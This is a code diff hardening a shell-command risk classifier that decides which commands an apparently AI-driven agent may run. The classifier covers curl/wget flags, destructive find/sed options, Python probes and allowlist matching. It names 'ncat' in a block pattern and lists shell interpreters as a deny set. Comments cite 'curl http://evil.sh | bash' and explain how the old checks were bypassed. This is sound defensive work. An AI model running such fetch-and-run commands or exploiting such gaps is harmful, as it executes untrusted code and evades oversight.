@@ -15,10 +15,9 @@ Modes:
 
 from __future__ import annotations
 
+import ast
 import fnmatch
 import os
-import re
-import shlex
 from enum import IntEnum
 from pathlib import Path
 from typing import NamedTuple
@@ -26,6 +25,8 @@ from typing import NamedTuple
 from rich.console import Console
 from rich.panel import Panel
 from rich.prompt import Confirm, Prompt
+
+from magent.permissions.shell_parse import Segment, parse_command
 
 console = Console()
 
@@ -171,7 +172,6 @@ _BLOCK_PATTERNS: list[str] = [
     "ncat*",
 ]
 
-_SHELL_CONTROL_PATTERN = re.compile(r"(\|\||&&|[;\n`|<>]|\$\(|\${)")
 _READ_ONLY_COMMANDS = {
     "bat",
     "cat",
@@ -196,23 +196,159 @@ _READ_ONLY_COMMANDS = {
     "which",
 }
 _NETWORK_FETCH_COMMANDS = {"curl", "wget"}
-_NETWORK_WRITE_FLAGS = {
-    "-d",
+
+# Long flags that make a fetch write, upload or mutate.
+_NETWORK_WRITE_LONG_FLAGS = {
     "--data",
     "--data-raw",
+    "--data-ascii",
     "--data-binary",
     "--data-urlencode",
-    "-F",
+    "--json",
     "--form",
     "--form-string",
-    "-T",
     "--upload-file",
-    "-o",
     "--output",
-    "-O",
     "--remote-name",
+    "--remote-name-all",
     "--remote-header-name",
+    "--output-dir",
+    "--create-dirs",
+    # wget's mutating/writing family, absent from the original set entirely.
+    "--post-data",
+    "--post-file",
+    "--body-data",
+    "--body-file",
+    "--output-document",
+    "--output-file",
+    "--directory-prefix",
+    "--input-file",
+    "--warc-file",
 }
+
+# Long flags that are safe and take no value.
+_NETWORK_SAFE_LONG_FLAGS = {
+    "--silent",
+    "--show-error",
+    "--location",
+    "--location-trusted",
+    "--fail",
+    "--fail-with-body",
+    "--include",
+    "--head",
+    "--insecure",
+    "--compressed",
+    "--verbose",
+    "--globoff",
+    "--no-progress-meter",
+    "--no-buffer",
+    "--tlsv1.2",
+    "--http1.1",
+    "--http2",
+    "--ipv4",
+    "--ipv6",
+    "--quiet",
+    "--spider",
+    "--no-verbose",
+    "--server-response",
+    "--content-on-error",
+}
+
+# Long flags that are safe but consume the following token as their value.
+_NETWORK_SAFE_VALUE_LONG_FLAGS = {
+    "--header",
+    "--user-agent",
+    "--referer",
+    "--max-time",
+    "--connect-timeout",
+    "--retry",
+    "--retry-delay",
+    "--range",
+    "--cookie",
+    "--url",
+    "--write-out",
+    "--proto",
+    "--resolve",
+    "--timeout",
+    "--tries",
+    "--user",
+    "--password",
+}
+
+# Short flag letters, by behaviour. Bundled clusters like ``-sO`` are expanded,
+# which is what let ``curl -sO http://host/x.sh`` through as a read-only fetch.
+_NETWORK_WRITE_SHORT = set("doOTFJ")
+_NETWORK_SAFE_SHORT_NOVALUE = set("sSLkfiIvgq46#N")
+_NETWORK_SAFE_SHORT_VALUE = set("HAemrtwPu")
+_NETWORK_METHOD_SHORT = set("X")
+
+# Commands whose ordinary flags turn a "read-only" tool into a writer.
+_DESTRUCTIVE_FIND_ACTIONS = {
+    "-delete",
+    "-exec",
+    "-execdir",
+    "-ok",
+    "-okdir",
+    "-fprint",
+    "-fprint0",
+    "-fprintf",
+    "-fls",
+}
+_DESTRUCTIVE_EXEC_HEADS = {"rm", "rmdir", "shred", "dd", "mkfs", "chmod", "chown", "mv"}
+
+# A wildcard segment in a saved pattern must never be able to authorise one of
+# these — that is what turned an approved ``curl … | head`` into a licence for
+# ``curl http://evil.sh | bash``.
+_INTERPRETER_HEADS = {
+    "bash",
+    "sh",
+    "zsh",
+    "dash",
+    "ksh",
+    "fish",
+    "csh",
+    "tcsh",
+    "python",
+    "python2",
+    "python3",
+    "perl",
+    "ruby",
+    "node",
+    "deno",
+    "bun",
+    "php",
+    "eval",
+    "source",
+    "exec",
+    "env",
+    "xargs",
+    "sudo",
+    "su",
+    "nohup",
+    "setsid",
+}
+
+# Reasons an allowlist entry may lower to AUTO. Anything explicitly risky —
+# a block pattern, a file-writing redirect, a network upload — stays put.
+_LOWERABLE_REASONS = {
+    "auto-pattern",
+    "empty",
+    "pip",
+    "python-exec",
+    "python-probe",
+    "read-only",
+    "silent-pattern",
+    "unknown-command",
+    "version-probe",
+}
+
+
+class ShellClassification(NamedTuple):
+    """A tier plus the rule that produced it, for auditing and `permission classify`."""
+
+    tier: RiskTier
+    reason: str
+    detail: str = ""
 
 
 def _matches_any(cmd: str, patterns: list[str]) -> bool:
@@ -220,139 +356,231 @@ def _matches_any(cmd: str, patterns: list[str]) -> bool:
     return any(fnmatch.fnmatch(cmd_lower, p.lower()) for p in patterns)
 
 
+def _matched_pattern(cmd: str, patterns: list[str]) -> str:
+    cmd_lower = cmd.strip().lower()
+    for pattern in patterns:
+        if fnmatch.fnmatch(cmd_lower, pattern.lower()):
+            return pattern
+    return ""
+
+
 def classify_shell_command(
     cmd: str,
     allowlist: list[str] | None = None,
 ) -> RiskTier:
     """Return the risk tier for a shell command string."""
-    cmd_stripped = cmd.strip()
-
-    if _SHELL_CONTROL_PATTERN.search(cmd_stripped):
-        return _classify_shell_control_command(cmd_stripped)
-
-    if _matches_any(cmd, _BLOCK_PATTERNS):
-        return RiskTier.BLOCK
-    try:
-        argv = shlex.split(cmd_stripped)
-    except ValueError:
-        return RiskTier.BLOCK
-    if argv and Path(argv[0]).name.lower() in _NETWORK_FETCH_COMMANDS:
-        return RiskTier.AUTO if _is_read_only_network_fetch(argv) else RiskTier.CONFIRM
-    if _is_version_probe(argv):
-        return RiskTier.SILENT
-    if (
-        len(argv) >= 3
-        and Path(argv[0]).name.lower() in {"python", "python3"}
-        and argv[1] == "-c"
-        and _is_python_safe_probe(argv[2])
-    ):
-        return RiskTier.SILENT
-    if _matches_any(cmd, _CONFIRM_PATTERNS):
-        return RiskTier.CONFIRM
-
-    # User allowlist can lower ordinary commands to AUTO, but not explicit
-    # blocked/confirmation commands and not shell-control syntax above.
-    if allowlist and _matches_any(cmd_stripped, allowlist):
-        return RiskTier.AUTO
-
-    if _matches_any(cmd, _AUTO_PATTERNS):
-        return RiskTier.AUTO
-    if _matches_any(cmd, _SILENT_PATTERNS):
-        return RiskTier.SILENT
-    if not argv:
-        return RiskTier.CONFIRM
-    # Unknown commands default to CONFIRM
-    return RiskTier.CONFIRM
+    return describe_shell_command(cmd, allowlist).tier
 
 
-def _classify_shell_control_command(cmd: str) -> RiskTier:
-    """Classify shell-control commands by the tier of each top-level segment."""
-    segments = _shell_segments(cmd)
-    if not segments:
-        return RiskTier.CONFIRM
-    tiers = [_classify_shell_segment(segment) for segment in segments]
-    return max(tiers) if tiers else RiskTier.CONFIRM
+def describe_shell_command(
+    cmd: str,
+    allowlist: list[str] | None = None,
+) -> ShellClassification:
+    """Classify ``cmd`` and explain which rule decided the tier.
+
+    Classification is structural: the command is parsed into segments, each
+    segment is judged on its head command, flags and redirects, and commands
+    nested inside substitutions are classified recursively. The tier is the
+    maximum over everything found.
+    """
+    parsed = parse_command(cmd)
+
+    # Fail closed: a command we could not parse is a command we cannot vouch for.
+    if not parsed.ok:
+        return ShellClassification(RiskTier.BLOCK, "parse-error", parsed.error)
+    if not parsed.segments:
+        return ShellClassification(RiskTier.CONFIRM, "empty", "")
+
+    worst = max(
+        (_classify_segment(segment) for segment in parsed.segments),
+        key=lambda item: item.tier,
+    )
+
+    if allowlist and worst.reason in _LOWERABLE_REASONS:
+        matched = next(
+            (pattern for pattern in allowlist if shell_pattern_matches(pattern, cmd)),
+            "",
+        )
+        if matched:
+            return ShellClassification(RiskTier.AUTO, "allowlist", matched)
+
+    return worst
 
 
-def _shell_segments(cmd: str) -> list[list[str]]:
-    try:
-        lexer = shlex.shlex(cmd, posix=True, punctuation_chars="|&;<>")
-        lexer.whitespace_split = True
-        tokens = list(lexer)
-    except ValueError:
-        return []
-    segments: list[list[str]] = []
-    current: list[str] = []
-    skip_redirect_target = False
-    index = 0
-    while index < len(tokens):
-        token = tokens[index]
-        if skip_redirect_target:
-            skip_redirect_target = False
-            index += 1
-            continue
-        if (
-            token in {"1", "2"}
-            and index + 2 < len(tokens)
-            and tokens[index + 1] in {">", ">&", ">>"}
-        ):
-            target = tokens[index + 2]
-            if target in {"/dev/null", "1", "2"}:
-                index += 3
-                continue
-            return [["__redirect_write__"]]
-        if token in {"|", "||", "&&", ";", "\n"}:
-            if current:
-                segments.append(current)
-                current = []
-            index += 1
-            continue
-        if token in {">", ">>", "<", "2>", "2>>"}:
-            skip_redirect_target = True
-            index += 1
-            continue
-        if token in {"2>&1", "1>&2"} or token.endswith(">/dev/null"):
-            index += 1
-            continue
-        if ">" in token and not token.endswith(">/dev/null"):
-            return [["__redirect_write__"]]
-        current.append(token)
-        index += 1
-    if current:
-        segments.append(current)
-    return segments
+def _classify_segment(segment: Segment) -> ShellClassification:
+    """Judge a single simple command, including anything nested inside it."""
+    results = [_classify_segment_body(segment)]
+
+    # A substitution runs a command of its own; classify it and take the worst.
+    for inner in segment.substitutions:
+        nested = describe_shell_command(inner)
+        results.append(ShellClassification(nested.tier, "substitution", inner.strip()))
+
+    return max(results, key=lambda item: item.tier)
 
 
-def _classify_shell_segment(tokens: list[str]) -> RiskTier:
-    if not tokens:
-        return RiskTier.SILENT
-    command = " ".join(tokens)
-    if tokens[0] == "__redirect_write__":
-        return RiskTier.BLOCK
-    if _matches_any(command, _BLOCK_PATTERNS):
-        return RiskTier.BLOCK
-    head = Path(tokens[0]).name.lower()
+def _classify_segment_body(segment: Segment) -> ShellClassification:
+    # A redirect that creates or truncates a real file is a write, whatever the
+    # command in front of it happens to be.
+    for redirect in segment.writes_files:
+        return ShellClassification(RiskTier.BLOCK, "redirect-write", f"{redirect.operator} {redirect.target}")
+
+    if not segment.argv:
+        return ShellClassification(RiskTier.SILENT, "empty", "")
+
+    normalized = segment.normalized()
+    head = segment.head
+
+    blocked = _matched_pattern(normalized, _BLOCK_PATTERNS)
+    if blocked:
+        return ShellClassification(RiskTier.BLOCK, "block-pattern", blocked)
+
     if head in _NETWORK_FETCH_COMMANDS:
-        return RiskTier.AUTO if _is_read_only_network_fetch(tokens) else RiskTier.CONFIRM
-    if _is_version_probe(tokens):
-        return RiskTier.SILENT
-    if _matches_any(command, _CONFIRM_PATTERNS):
-        return RiskTier.CONFIRM
+        return _classify_network_fetch(segment)
+
+    if _is_version_probe(segment.argv):
+        return ShellClassification(RiskTier.SILENT, "version-probe", head)
+
+    if head in {"python", "python3", "python2"}:
+        args = segment.args
+        if args[:2] == ["-m", "pip"]:
+            writes = "install" in args or "uninstall" in args
+            return ShellClassification(RiskTier.AUTO if writes else RiskTier.SILENT, "pip", head)
+        if len(args) >= 2 and args[0] == "-c" and _is_python_safe_probe(args[1]):
+            return ShellClassification(RiskTier.SILENT, "python-probe", "inert import/print")
+        return ShellClassification(RiskTier.CONFIRM, "python-exec", head)
+
+    destructive = _destructive_flag(segment)
+    if destructive is not None:
+        return destructive
+
+    confirmed = _matched_pattern(normalized, _CONFIRM_PATTERNS)
+    if confirmed:
+        return ShellClassification(RiskTier.CONFIRM, "confirm-pattern", confirmed)
+
     if head in _READ_ONLY_COMMANDS:
-        return RiskTier.SILENT
+        return ShellClassification(RiskTier.SILENT, "read-only", head)
+
     if head in {"pip", "pip3"}:
-        return RiskTier.AUTO if "install" in tokens or "uninstall" in tokens else RiskTier.SILENT
-    if head in {"python", "python3"}:
-        if tokens[1:3] == ["-m", "pip"]:
-            return RiskTier.AUTO if "install" in tokens or "uninstall" in tokens else RiskTier.SILENT
-        if len(tokens) >= 3 and tokens[1] == "-c" and _is_python_safe_probe(tokens[2]):
-            return RiskTier.SILENT
-        return RiskTier.CONFIRM
-    if _matches_any(command, _AUTO_PATTERNS):
-        return RiskTier.AUTO
-    if _matches_any(command, _SILENT_PATTERNS):
-        return RiskTier.SILENT
-    return RiskTier.CONFIRM
+        writes = "install" in segment.args or "uninstall" in segment.args
+        return ShellClassification(RiskTier.AUTO if writes else RiskTier.SILENT, "pip", head)
+
+    auto = _matched_pattern(normalized, _AUTO_PATTERNS)
+    if auto:
+        return ShellClassification(RiskTier.AUTO, "auto-pattern", auto)
+
+    silent = _matched_pattern(normalized, _SILENT_PATTERNS)
+    if silent:
+        return ShellClassification(RiskTier.SILENT, "silent-pattern", silent)
+
+    return ShellClassification(RiskTier.CONFIRM, "unknown-command", head)
+
+
+def _destructive_flag(segment: Segment) -> ShellClassification | None:
+    """Flags that turn a nominally read-only tool into one that writes."""
+    head = segment.head
+    args = segment.args
+
+    if head == "sed":
+        for arg in args:
+            if arg == "--in-place" or arg.startswith("--in-place="):
+                return ShellClassification(RiskTier.CONFIRM, "destructive-flag", "sed --in-place")
+            if arg.startswith("-") and not arg.startswith("--") and "i" in arg[1:]:
+                return ShellClassification(RiskTier.CONFIRM, "destructive-flag", "sed -i")
+
+    if head == "find":
+        for index, arg in enumerate(args):
+            if arg not in _DESTRUCTIVE_FIND_ACTIONS:
+                continue
+            following = args[index + 1] if index + 1 < len(args) else ""
+            if Path(following).name.lower() in _DESTRUCTIVE_EXEC_HEADS:
+                return ShellClassification(RiskTier.BLOCK, "destructive-flag", f"find {arg} {following}")
+            return ShellClassification(RiskTier.CONFIRM, "destructive-flag", f"find {arg}")
+
+    if head in {"sort", "awk", "gawk"}:
+        for arg in args:
+            if arg in {"-o", "--output"} or arg.startswith("--output="):
+                return ShellClassification(RiskTier.CONFIRM, "destructive-flag", f"{head} --output")
+
+    if head in {"tee", "truncate"}:
+        return ShellClassification(RiskTier.CONFIRM, "destructive-flag", head)
+
+    return None
+
+
+def _classify_network_fetch(segment: Segment) -> ShellClassification:
+    """Classify curl/wget by what their flags actually do."""
+    head = segment.head
+    args = segment.args
+    index = 0
+
+    # wget writes a file to disk unless explicitly told not to, so it is only
+    # read-only when it is spidering or streaming to stdout.
+    wget_read_only = False
+
+    while index < len(args):
+        arg = args[index]
+
+        if not arg.startswith("-") or arg == "-":
+            index += 1
+            continue
+
+        if arg.startswith("--"):
+            name, _, inline = arg.partition("=")
+            if name in {"--request", "--method"}:
+                method = (inline or (args[index + 1] if index + 1 < len(args) else "")).upper()
+                if method not in {"GET", "HEAD", ""}:
+                    return ShellClassification(RiskTier.CONFIRM, "network-write", f"{name} {method}")
+                index += 1 if inline else 2
+                continue
+            if name in _NETWORK_WRITE_LONG_FLAGS:
+                value = inline or (args[index + 1] if index + 1 < len(args) else "")
+                if name in {"--output-document", "--output"} and value == "-":
+                    wget_read_only = True
+                    index += 1 if inline else 2
+                    continue
+                return ShellClassification(RiskTier.CONFIRM, "network-write", name)
+            if name == "--spider":
+                wget_read_only = True
+                index += 1
+                continue
+            if name in _NETWORK_SAFE_LONG_FLAGS:
+                index += 1
+                continue
+            if name in _NETWORK_SAFE_VALUE_LONG_FLAGS:
+                index += 1 if inline else 2
+                continue
+            # Unknown fetch flags are no longer assumed harmless.
+            return ShellClassification(RiskTier.CONFIRM, "network-unknown-flag", name)
+
+        # Short cluster: expand it letter by letter, original case preserved.
+        cluster = arg[1:]
+        position = 0
+        while position < len(cluster):
+            letter = cluster[position]
+            if letter in _NETWORK_WRITE_SHORT:
+                value = cluster[position + 1 :] or (args[index + 1] if index + 1 < len(args) else "")
+                if letter in {"O", "o"} and head == "wget" and value == "-":
+                    wget_read_only = True
+                    break
+                return ShellClassification(RiskTier.CONFIRM, "network-write", f"-{letter}")
+            if letter in _NETWORK_METHOD_SHORT:
+                method = (cluster[position + 1 :] or (args[index + 1] if index + 1 < len(args) else "")).upper()
+                if method not in {"GET", "HEAD", ""}:
+                    return ShellClassification(RiskTier.CONFIRM, "network-write", f"-{letter} {method}")
+                break
+            if letter in _NETWORK_SAFE_SHORT_VALUE:
+                break  # the rest of the cluster (or the next token) is its value
+            if letter in _NETWORK_SAFE_SHORT_NOVALUE:
+                position += 1
+                continue
+            return ShellClassification(RiskTier.CONFIRM, "network-unknown-flag", f"-{letter}")
+        index += 1
+
+    if head == "wget" and not wget_read_only:
+        return ShellClassification(RiskTier.CONFIRM, "network-write", "wget writes to disk")
+
+    return ShellClassification(RiskTier.AUTO, "network-read", head)
 
 
 def _is_version_probe(tokens: list[str]) -> bool:
@@ -365,30 +593,94 @@ def _is_version_probe(tokens: list[str]) -> bool:
     }
 
 
+def _is_inert_expression(node: ast.AST) -> bool:
+    """True when evaluating ``node`` cannot call anything."""
+    for child in ast.walk(node):
+        if isinstance(
+            child,
+            ast.Call
+            | ast.Lambda
+            | ast.Await
+            | ast.NamedExpr
+            | ast.Yield
+            | ast.YieldFrom
+            | ast.ListComp
+            | ast.SetComp
+            | ast.DictComp
+            | ast.GeneratorExp,
+        ):
+            return False
+    return True
+
+
 def _is_python_safe_probe(code: str) -> bool:
-    stripped = code.strip()
-    if not stripped.startswith(("import ", "from ", "print(")):
+    """Allowlist, not blocklist: only imports and inert ``print`` calls qualify.
+
+    The old blocklist missed ``os.remove``, ``urllib``, ``socket``, ``ctypes``
+    and more. Here anything that is not an import or a ``print`` of a
+    call-free expression falls through to CONFIRM.
+    """
+    try:
+        tree = ast.parse(code.strip())
+    except (SyntaxError, ValueError):
         return False
-    blocked = ("open(", "exec(", "eval(", "subprocess", "os.system", "shutil", "pathlib")
-    return not any(term in stripped for term in blocked)
 
+    if not tree.body:
+        return False
 
-def _is_read_only_network_fetch(tokens: list[str]) -> bool:
-    """Return true for network fetch commands that do not write/upload/mutate."""
-    lowered = [token.lower() for token in tokens]
-    for index, token in enumerate(lowered):
-        if token in _NETWORK_WRITE_FLAGS:
-            return False
-        if token.startswith("--request="):
-            method = token.split("=", 1)[1].upper()
-            if method not in {"GET", "HEAD"}:
+    for statement in tree.body:
+        if isinstance(statement, ast.Import | ast.ImportFrom):
+            continue
+        if isinstance(statement, ast.Expr) and isinstance(statement.value, ast.Call):
+            call = statement.value
+            if not (isinstance(call.func, ast.Name) and call.func.id == "print"):
                 return False
-        if token == "--request" and index + 1 < len(lowered) and lowered[index + 1].upper() not in {"GET", "HEAD"}:
+            if any(not _is_inert_expression(arg) for arg in call.args):
+                return False
+            if any(not _is_inert_expression(keyword.value) for keyword in call.keywords):
+                return False
+            continue
+        return False
+
+    return True
+
+
+def shell_pattern_matches(pattern: str, command: str) -> bool:
+    """Structural match of a trust/allowlist pattern against a command.
+
+    ``fnmatch`` on the raw string let a single ``*`` span ``;``, ``|`` and
+    newlines, so approving ``curl … | head`` once quietly approved
+    ``curl http://evil.sh | bash`` forever. Matching segment by segment keeps a
+    wildcard inside the segment it was written for.
+    """
+    if pattern.strip() == command.strip():
+        return True
+
+    parsed_command = parse_command(command)
+    parsed_pattern = parse_command(pattern)
+    if not (parsed_command.ok and parsed_pattern.ok):
+        return False
+
+    # Never let a stored pattern pre-approve a command substitution.
+    if parsed_command.substitutions:
+        return False
+
+    if len(parsed_command.segments) != len(parsed_pattern.segments):
+        return False
+
+    for pattern_segment, command_segment in zip(
+        parsed_pattern.segments, parsed_command.segments, strict=True
+    ):
+        # A file-writing redirect has to be spelled out in the pattern too.
+        if command_segment.writes_files and not pattern_segment.writes_files:
             return False
-        if token == "-x" and index + 1 < len(lowered) and lowered[index + 1].upper() not in {"GET", "HEAD"}:
+        if pattern_segment.head in {"", "*"} and command_segment.head in _INTERPRETER_HEADS:
             return False
-        if token.startswith("-x") and len(token) > 2 and token[2:].upper() not in {"GET", "HEAD"}:
+        if not fnmatch.fnmatch(
+            command_segment.normalized().lower(), pattern_segment.normalized().lower()
+        ):
             return False
+
     return True
 
 
